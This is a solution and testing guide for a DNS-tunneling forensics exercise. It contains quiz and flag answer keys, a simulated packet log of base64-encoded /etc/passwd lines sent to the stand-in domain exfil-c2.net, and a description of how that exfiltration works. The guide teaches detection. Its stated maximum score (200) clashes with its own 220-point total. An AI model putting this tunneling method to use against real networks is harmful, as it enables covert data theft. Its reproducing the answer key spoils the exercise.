# Scenario 04 — The Whispering DNS

## Full Testing and Solution Guide

> **Domain:** Network Forensics — DNS Tunneling Exfiltration  
> **Difficulty:** ★★★☆☆ (3/5)  
> **Estimated Time:** 20 minutes  
> **Max Possible Score:** 200 pts


## Table of Contents

1. [Scenario Overview](#1-scenario-overview)
2. [The Theory Behind It](#2-the-theory-behind-it)
3. [Pre-Quiz — Answers and Rationale](#3-pre-quiz--answers--rationale)
4. [Network Log Layout](#4-network-log-layout)
5. [Investigation Walkthrough](#5-investigation-walkthrough)
6. [Flags — What to Submit and Why](#6-flags--what-to-submit--why)
7. [Hints and Their Cost](#7-hints--their-cost)
8. [Scoring Breakdown](#8-scoring-breakdown)
9. [Views to Test](#9-views-to-test)
10. [Post-Quiz — Answers and Rationale](#10-post-quiz--answers--rationale)
11. [Debriefing Verification](#11-debriefing-verification)
12. [Common Mistakes and Edge Cases](#12-common-mistakes--edge-cases)


## 1. Scenario Overview

**Narrative:**  
The egress filter analyst at Cobalt Industries flagged an alert: unusually high DNS query volume from a single workstation over a 4-minute window. The PCAP has been extracted. At first glance, it looks like normal DNS traffic — but the query patterns are anything but normal.

**Learning Objective:**  
Understand how DNS tunneling works for data exfiltration — encoding data in DNS subdomain labels and TXT record responses. Learn to identify DNS tunneling by recognizing anomalous query patterns.


## 2. The Theory Behind It

### The DNS Protocol — A Quick Primer

DNS (Domain Name System) translates human-readable domain names (e.g., `www.google.com`) into IP addresses. It uses:

- **Port 53** (UDP primarily, TCP for zone transfers)
- **Query/Response** model
- **Hierarchical resolution** through root → TLD → authoritative servers

### Why DNS Is Abused for Exfiltration

1. **Almost never blocked** — DNS is essential for network operation; firewalls rarely block port 53
2. **Rarely inspected** — most security tools don't deeply inspect DNS payload content
3. **Recursive resolution** — queries for unknown domains are forwarded to external resolvers
4. **Allows arbitrary subdomains** — the attacker controls what they put in the query

### DNS Label Limits (RFC 1035)

| Parameter | Limit |
|-----------|-------|
| Single label (between dots) | **63 characters** max |
| Total domain name | **253 characters** max |
| Labels per domain | **127** max |

DNS tunneling tools pack data into subdomain labels up to these limits.

### How DNS Tunneling Works

```
┌──────────────┐                  ┌──────────────┐                  ┌──────────────┐
│   Infected   │    DNS Query     │   Corporate  │    DNS Query     │  Attacker's  │
│  Workstation │ ──────────────►  │   Recursive  │ ──────────────►  │ Authoritative│
│ 192.168.1.47 │                  │   Resolver   │                  │   DNS Server │
│              │                  │   (8.8.8.8)  │                  │ (exfil-c2.net)│
│              │  ◄──────────────  │              │  ◄──────────────  │              │
│              │    DNS Response   │              │    DNS Response   │              │
└──────────────┘    (TXT record)  └──────────────┘    (TXT record)  └──────────────┘
```

**Outbound data (exfiltration):**
1. Malware reads the target file (e.g., `/etc/passwd`)
2. Splits the content into chunks
3. Base64-encodes each chunk
4. Sends DNS queries: `<encoded_chunk>.exfil-c2.net`
5. The query reaches the attacker's DNS server, which extracts the data

**Inbound data (C2 commands):**
1. The attacker's DNS server responds with TXT records containing encoded commands
2. The malware reads the TXT record response and executes the command

### Base64 Encoding

Base64 encodes binary data using 64 printable ASCII characters (A-Z, a-z, 0-9, +, /). It increases data size by ~33% but makes it safe for text-based protocols.

**Example from this scenario:**
```
Encoded:  cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4v
Decoded:  root:x:0:0:root:/root:/bin/
```
This is the first line of `/etc/passwd`.

### Detection Indicators

| Indicator | Normal DNS | DNS Tunneling |
|-----------|-----------|---------------|
| Query volume | ~50/hour | **847 in 4 minutes** |
| Subdomain length | 5-15 chars | **30-63 chars** |
| Subdomain entropy | Low (human words) | **High (base64)** |
| Unique domains | Many different | **One domain, many subdomains** |
| Response types | A records | **TXT records (large)** |
| Query timing | Sporadic | **Burst pattern** |


## 3. Pre-Quiz — Answers and Rationale

### Question 1
> **"What is the maximum length of a single DNS subdomain label?"**

| # | Option | Correct? |
|---|--------|----------|
| **0** | **63 characters** | **✅** |
| 1 | 128 characters | ❌ |
| 2 | 253 characters | ❌ (this is the total domain length limit) |
| 3 | 255 characters | ❌ |

**Why:** RFC 1035 specifies that a single label (the part between dots) can be at most 63 octets. The total fully qualified domain name can be up to 253 characters.

### Question 2
> **"What is the primary purpose of the DNS protocol?"**

| # | Option | Correct? |
|---|--------|----------|
| 0 | Encrypting web traffic between browser and server | ❌ (that's TLS) |
| **1** | **Translating human-readable domain names into IP addresses** | **✅** |
| 2 | Managing email routing between servers | ❌ (that's MX records, a subset) |
| 3 | Authenticating users on a corporate network | ❌ (that's LDAP/Kerberos) |

**Why:** The primary function of DNS is name resolution. Because it's so fundamental, DNS traffic is almost never blocked — which makes it an ideal covert channel.

### Question 3
> **"Why is DNS traffic rarely blocked by firewalls?"**

| # | Option | Correct? |
|---|--------|----------|
| 0 | DNS uses encryption by default, so firewalls cannot inspect it | ❌ |
| **1** | **DNS is essential for network operation — blocking it would prevent all domain name resolution** | **✅** |
| 2 | DNS only operates on the local network segment | ❌ |
| 3 | Firewalls are not designed to filter UDP traffic | ❌ |

**Why:** DNS is fundamental infrastructure — without it, no domain name can be resolved. This makes it an attractive covert channel because it's almost always allowed through firewalls.

### Question 4
> **"What type of DNS record is commonly used by tunneling tools to send data back from the attacker's server to the compromised host?"**

| # | Option | Correct? |
|---|--------|----------|
| 0 | A records (IP addresses) | ❌ |
| 1 | AAAA records (IPv6 addresses) | ❌ |
| **2** | **TXT records (arbitrary text data)** | **✅** |
| 3 | NS records (nameserver delegation) | ❌ |

**Why:** TXT records can contain arbitrary text strings up to 255 characters per string. DNS tunneling tools use TXT responses to send commands or data back to the compromised host.


## 4. Network Log Layout

This scenario has **NO filesystem** and **NO RAM dump** — it focuses entirely on the network log.

### Packet Capture Summary

| # | Time | Src | Dst | Protocol | Info | Suspicious? |
|---|------|-----|-----|----------|------|-------------|
| 1 | 14:22:01.103 | 192.168.1.47 | 8.8.8.8 | DNS | A query: mail.google.com | ❌ Normal |
| 2 | 14:22:01.248 | 8.8.8.8 | 192.168.1.47 | DNS | A response: 142.250.80.5 | ❌ Normal |
| 3 | 14:22:03.410 | 192.168.1.47 | 8.8.8.8 | DNS | A query: `cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4v.exfil-c2.net` | **🚩** |
| 4 | 14:22:03.512 | 8.8.8.8 | 192.168.1.47 | DNS | TXT response: [64 bytes encoded] | **🚩** |
| 5 | 14:22:03.780 | 192.168.1.47 | 8.8.8.8 | DNS | A query: `YmFzaDpkYWVtb246L3Vzci9iaW4vbm9sb2dpbg.exfil-c2.net` | **🚩** |
| 6 | 14:22:03.891 | 8.8.8.8 | 192.168.1.47 | DNS | TXT response: [64 bytes encoded] | **🚩** |
| 7 | 14:22:04.110 | 192.168.1.47 | 8.8.8.8 | DNS | A query: `c3luYzp4OjU6MDpzeW5jOi9zYmluOi9iaW4v.exfil-c2.net` | **🚩** |
| 8 | 14:22:04.220 | 8.8.8.8 | 192.168.1.47 | DNS | TXT response: [64 bytes encoded] | **🚩** |
| 9 | 14:22:04.501 | 192.168.1.47 | 8.8.8.8 | DNS | A query: `bWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW4.exfil-c2.net` | **🚩** |
| 10 | 14:22:04.612 | 8.8.8.8 | 192.168.1.47 | DNS | TXT response: [64 bytes encoded] | **🚩** |
| 11 | 14:22:05.003 | 192.168.1.47 | 8.8.8.8 | DNS | A query: `bHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6.exfil-c2.net` | **🚩** |
| 12 | 14:22:05.890 | 192.168.1.47 | 8.8.8.8 | DNS | A query: `d3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTov.exfil-c2.net` | **🚩** |
| 13 | 14:22:06.210 | 192.168.1.47 | 8.8.8.8 | DNS | A query: `bm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5.exfil-c2.net` | **🚩** |
| 14 | 14:22:06.890 | 192.168.1.47 | 8.8.8.8 | DNS | A query: `c3lzdGVtZC1yZXNvbHZlOng6MTAxOjEwMzpz.exfil-c2.net` | **🚩** |
| 15 | 14:22:07.330 | 192.168.1.47 | 8.8.8.8 | DNS | ...847 total queries to *.exfil-c2.net | **🚩** |
| 16 | 14:22:14.550 | 192.168.1.47 | 8.8.8.8 | DNS | A query: www.microsoft.com | ❌ Normal |
| 17 | 14:22:14.680 | 8.8.8.8 | 192.168.1.47 | DNS | A response: 20.70.246.20 | ❌ Normal |
| 18 | 14:26:01.020 | 192.168.1.47 | 8.8.8.8 | DNS | A query: `RU9GCg.exfil-c2.net` (final chunk) | **🚩** |

### Decoded Subdomains

| Encoded Subdomain | Decoded Content |
|-------------------|-----------------|
| `cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4v` | `root:x:0:0:root:/root:/bin/` |
| `YmFzaDpkYWVtb246L3Vzci9iaW4vbm9sb2dpbg` | `bash:daemon:/usr/bin/nologin` |
| `c3luYzp4OjU6MDpzeW5jOi9zYmluOi9iaW4v` | `sync:x:5:0:sync:/sbin:/bin/` |
| `RU9GCg` | `EOF` (end of file marker) |

**These are lines from `/etc/passwd`** — the Unix/Linux file containing system user accounts.


## 5. Investigation Walkthrough

### Step 1: Switch to the Network View

Click the **Network** tab in the EvidenceNavigator. This displays the packet capture table.

### Step 2: Identify the Anomalous Traffic Pattern

Scan through the packets and notice:
- Packets 1-2 and 16-17 are **normal** DNS queries (mail.google.com, www.microsoft.com)
- Packets 3-15 and 18 are queries to **`*.exfil-c2.net`** — all suspicious

**Key observations:**
1. **847 queries** to a single domain in ~4 minutes → massively abnormal volume
2. **All to the same domain** (`exfil-c2.net`) → not normal browsing behavior
3. **Long, random-looking subdomains** → not human-readable (base64-encoded data)
4. **TXT record responses** → used for returning data to the malware

### Step 3: Recognize the Domain as Suspicious

**`exfil-c2.net`** — the domain name itself is a clue:
- `exfil` = exfiltration
- `c2` = command and control
- In a real investigation, you'd check WHOIS, VirusTotal, and passive DNS databases

### Step 4: Decode the Subdomains

Take the first subdomain: `cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4v`

**Base64 decode it:**
```
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4v
→ root:x:0:0:root:/root:/bin/
```

This is the **first line of `/etc/passwd`**!

**Decode more:**
```
YmFzaDpkYWVtb246L3Vzci9iaW4vbm9sb2dpbg → bash:daemon:/usr/bin/nologin
c3luYzp4OjU6MDpzeW5jOi9zYmluOi9iaW4v → sync:x:5:0:sync:/sbin:/bin/
RU9GCg → EOF
```

### Step 5: Understand the Attack

The attacker:
1. Compromised the workstation at 192.168.1.47
2. Read the `/etc/passwd` file
3. Split it into base64 chunks
4. Sent each chunk as a DNS subdomain query to `exfil-c2.net`
5. The data traversed the firewall as "normal DNS traffic"
6. The attacker's DNS server collected and reassembled the file

### Step 6: Tag Evidence and Verify Rich Metadata

1. In the **Network** panel, expand any of the suspicious queries directed to the `*.exfil-c2.net` domain (e.g., Packet #3, #5, #7, etc.).
2. Notice the interactive **"Tag Evidence"** button in the packet details panel.
3. Click the **"Tag"** button. This automatically captures the packet's metadata as rich, context-aware evidence, saving it as:
   `DNS: A query: <base64_payload>.exfil-c2.net (192.168.1.47 → 8.8.8.8)`
   This rich name serves as a vital bridge, embedding both the DNS protocol, the suspicious exfiltration domain, and the exfiltrated base64 data directly into the tagged evidence!
4. The notebook engine uses an advanced content-based override matching rule for Scenario 4 Content/Domain/Technique flags: tagging **any** suspicious DNS query containing the exfiltration signatures will successfully register as the correct evidence piece for all three flags.

---

## 6. Flags — What to Submit and Why

The game engine utilizes an advanced submission normalization framework (`normalizeString`) alongside a flexible dual-matching engine. 

### 💡 Advanced Matching Features
* **Dual Target/Finding Acceptance**: Students can submit either the **Target** (e.g., `exfil-c2.net`, `passwd file`) or the **Finding** (e.g., `suspicious domain`, `/etc/passwd`), and both are recognized as correct!
* **Normalization Engine**: Input strings automatically lowercase, trim, strip leading/trailing slashes (so `/etc/passwd` and `etc/passwd` match perfectly), and ignore casing, spaces, underscores, periods, and hyphens (so `EXFIL-C2.NET` and `exfil-c2.net` match perfectly).

---

### Flag 1: Suspicious Domain (30 points)

* **Evidence to Select**: Tagged DNS network packet (e.g., `DNS: A query: cm9vdDp4Oj...exfil-c2.net`)
* **What to type (Technique/Finding Input)**:
  * `exfil-c2.net` ✅ (Matches target)
  * `suspicious domain` ✅ (Matches finding)
  * `exfil-c2.net is the C2 domain` ✅ (Contains target/finding)
  * `EXFIL-C2.NET` ✅ (Normalized case & characters)

**Why**: Identifying the external command-and-control server hosting the rogue DNS resolver is the starting point of network forensics.

---

### Flag 2: DNS Tunneling Technique (35 points)

* **Evidence to Select**: Tagged DNS network packet (e.g., `DNS: A query: cm9vdDp4Oj...exfil-c2.net`)
* **What to type (Technique/Finding Input)**:
  * `DNS tunneling` ✅ (Matches target)
  * `data exfiltration` ✅ (Matches finding)
  * `DNS tunneling for data exfiltration` ✅ (Contains target/finding)
  * `dns-tunneling` ✅ (Normalized hyphens)

**Why**: Understanding that the traffic abuses standard DNS UDP port 53 to establish a covert channel confirms that the student understands the exfiltration vector.

---

### Flag 3: Exfiltrated Content (35 points)

* **Evidence to Select**: Tagged DNS network packet (e.g., `DNS: A query: cm9vdDp4Oj...exfil-c2.net`)
* **What to type (Technique/Finding Input)**:
  * `passwd file` ✅ (Matches target)
  * `/etc/passwd` ✅ (Matches finding)
  * `etc/passwd` ✅ (Matches normalized finding)
  * `The subdomains decode to /etc/passwd` ✅ (Contains target/finding)

**Why**: Reassembling the base64 chunks reveals the system configuration payload `/etc/passwd`. Because the literal characters do not appear in raw packets, the notebook engine implements a robust content fallback matching rule linking any suspicious base64 query to this system file.


## 7. Hints and Their Cost

| Tier | Cost | Text | What it reveals |
|------|------|------|----------------|
| 1 | −10 pts | "Look at the network log. Most DNS queries are to normal domains — but one domain appears hundreds of times. What's unusual about it?" | Points toward exfil-c2.net |
| 2 | −20 pts | "The subdomains in the queries to exfil-c2.net look like random characters — but they're actually base64-encoded data. Try decoding one." | Reveals base64 encoding |
| 3 | −30 pts | "Decode 'cm9vdDp4OjA6MDpyb290' from base64. It's 'root:x:0:0:root' — the first line of /etc/passwd." | Complete solution |


## 8. Scoring Breakdown

| Component | Points |
|-----------|--------|
| Starting score | 100 |
| Flag 1 (suspicious domain) | +30 |
| Flag 2 (DNS tunneling) | +35 |
| Flag 3 (/etc/passwd) | +35 |
| Wrong submissions | −5 each |
| Hints | −10, −20, −30 |
| Post-quiz bonus | +0 to +20 |

**Perfect run:** 100 + 30 + 35 + 35 + 20 = **220 pts**


## 9. Views to Test

### Network View (Primary)
This is the **main view** for this scenario. Verify:
- All 18 packets display correctly in the table
- Suspicious packets are highlighted in amber/yellow
- Normal packets show in default color
- Columns: #, TIME, SRC, DST, PROTO, INFO

### Explorer View
- Should show: **"No filesystem data in this scenario"**
- This scenario has no `filesystem` key

### Terminal View
- Standard commands should work for `help`
- `ls` should report "No filesystem loaded"

### RAM View
- Should show: **"No RAM dump in this scenario"**
- This scenario has no `ram_dump` key

### HEX View
- Should show: **"Select a file in the Explorer first"**


## 10. Post-Quiz — Answers and Rationale

### Question 1
> **"How do DNS tunneling tools like iodine and dnscat2 implement data exfiltration?"**

| # | Option | Correct? |
|---|--------|----------|
| 0 | They encrypt DNS responses with TLS | ❌ (DNS over TLS is different) |
| **1** | **They encode data as subdomain labels in DNS queries and receive responses via TXT records** | **✅** |
| 2 | They replace DNS packets with TCP packets at the network layer | ❌ |
| 3 | They use DNS over HTTPS (DoH) to hide traffic | ❌ (DoH is a legitimate privacy feature) |

**Why:** The core mechanism is using DNS as a data transport: outbound data goes in subdomain labels (encoded), inbound data comes back in TXT record responses.

### Question 2
> **"Which of the following is the strongest indicator of DNS tunneling?"**

| # | Option | Correct? |
|---|--------|----------|
| 0 | DNS queries using TCP instead of UDP | ❌ (TCP DNS is normal for large responses) |
| **1** | **A high volume of queries with long, random-looking subdomains to a single external domain** | **✅** |
| 2 | DNS responses with NXDOMAIN errors | ❌ (NXDOMAIN is normal for typos) |
| 3 | DNS queries from multiple source IP addresses | ❌ (normal network behavior) |

**Why:** The combination of high volume + long subdomains + single destination domain is the hallmark of DNS tunneling. Normal DNS has short, human-readable labels.

### Question 3
> **"What was the strongest indicator that the DNS traffic in this scenario was malicious rather than normal browsing?"**

| # | Option | Correct? |
|---|--------|----------|
| 0 | The queries used TCP instead of UDP | ❌ |
| **1** | **847 queries with long, high-entropy subdomains were sent to a single domain in 4 minutes** | **✅** |
| 2 | The DNS server responded with NXDOMAIN errors | ❌ |
| 3 | The queries came from multiple source IP addresses | ❌ |

**Why:** The combination of extreme volume (847 queries in 4 minutes), long random-looking subdomains (base64-encoded data), and a single destination domain (exfil-c2.net) is the hallmark of DNS tunneling.

### Question 4
> **"What specific data was being exfiltrated through the DNS tunnel in this case?"**

| # | Option | Correct? |
|---|--------|----------|
| 0 | Windows registry keys | ❌ |
| 1 | Browser cookies and session tokens | ❌ |
| **2** | **The /etc/passwd file containing system user accounts** | **✅** |
| 3 | Database credentials stored in environment variables | ❌ |

**Why:** Decoding the base64 subdomains revealed lines from /etc/passwd (e.g., 'root:x:0:0:root:/root:/bin/'). The attacker was exfiltrating the system's user account database through DNS queries.


## 11. Debriefing Verification

Verify the debriefing shows:
- **Title:** "How DNS Tunneling Works"
- **Concept:** DNS protocol abuse, subdomain encoding, TXT responses, authoritative DNS servers
- **Real-World Tools:** iodine, dnscat2, Cobalt Strike, Zeek DNS analytics, passive DNS
- **Case Connection:** 847 queries, 4 minutes, ~40-char base64 subdomains, /etc/passwd decoded
- **Further Reading:** iodine, dnscat2, Cobalt Strike beaconing, Zeek, passive DNS, RFC 1035


## 12. Common Mistakes and Edge Cases

### Testing Edge Cases

| Test Input / Action | Expected Engine Behavior & Rationale |
|---------------------|--------------------------------------|
| **Clicking Explorer/RAM/HEX tabs** | Correctly shows "No data/No files" empty panel states since this is a pure network forensic scenario. |
| **Submitting "EXFIL-C2.NET" (Uppercase)** | **Success**. Normalizes to `exfilc2net` and matches Flag 1. |
| **Submitting "/etc/passwd" vs "etc/passwd"** | **Success**. Normalizes to `etcpasswd` by stripping leading/trailing slashes and matches Flag 3. |
| **Submitting "dns-tunneling" (Hyphenated)** | **Success**. Strips hyphens and normalizes to `dnstunneling` to match Flag 2. |
| **Submitting "suspicious domain" (Finding) vs "exfil-c2.net" (Target)** | **Success**. Both paths are fully mapped; the dual-matching engine approves either entry. |
| **Tagging *any* C2 DNS Query Packet** | **Success**. Rich metadata tagging generates a packet string containing `exfil-c2.net`. The notebook has a Scenario 4 content override so tagging *any* of the queries containing this domain serves as the correct evidence for Flag 1, 2, and 3. |
| **Submitting "base64" alone** | **Failure**. Does not match any flag targets or findings (proper rejection). |
| **Submitting "DNS" alone** | **Failure**. Rejected because "DNS" is too generic and doesn't explicitly target the core tunneling technique. |

### Common Student Mistakes

1. **Not recognizing base64** — The subdomain strings look random but are structured base64. Students who don't recognize the character set (A-Z, a-z, 0-9) may miss this.
2. **Focusing on the normal traffic** — Packets 1-2 and 16-17 are decoys; the key evidence is in the burst of exfil-c2.net queries.
3. **Not connecting volume to technique** — Seeing "847 queries" without realizing that's abnormal for DNS.
4. **Ignoring TXT responses** — The TXT records are the **inbound** channel; students may focus only on the queries (outbound).
5. **Confusing DNS over HTTPS (DoH) with DNS tunneling** — DoH is a privacy feature that encrypts DNS; DNS tunneling uses DNS as a covert data channel regardless of encryption.

### Real-World Detection Comparison

Students should understand how this would be detected in practice:

| Method | Tool | What it detects |
|--------|------|-----------------|
| Query volume monitoring | Zeek, Suricata | Abnormal query rate to single domain |
| Subdomain length analysis | Custom scripts, Zeek | Labels >20 chars are suspicious |
| Shannon entropy | Statistical analysis | High-entropy subdomains indicate encoding |
| Passive DNS | DNSDB, Farsight | Unknown domain with no history |
| Response size monitoring | IDS rules | Unusually large TXT responses |


## Quick Reference Card

```
┌──────────────────────────────────────────────────┐
│  SCENARIO 04 — THE WHISPERING DNS                │
│                                                  │
│  Flag 1: exfil-c2.net — suspicious domain (30)   │
│  Flag 2: DNS tunneling — data exfiltration (35)  │
│  Flag 3: passwd file — /etc/passwd (35 pts)      │
│                                                  │
│  Key View: Network tab (primary)                 │
│  Anomaly: 847 queries in 4 min to exfil-c2.net   │
│  Encoding: Base64 in subdomain labels            │
│  Stolen Data: /etc/passwd file contents          │
│                                                  │
│  Pre-Quiz: 1→A, 2→B, 3→B, 4→C                    │
│  Post-Quiz: 1→B, 2→B, 3→B, 4→C                   │
│                                                  │
│  NO filesystem, NO RAM dump                      │
└──────────────────────────────────────────────────┘
```
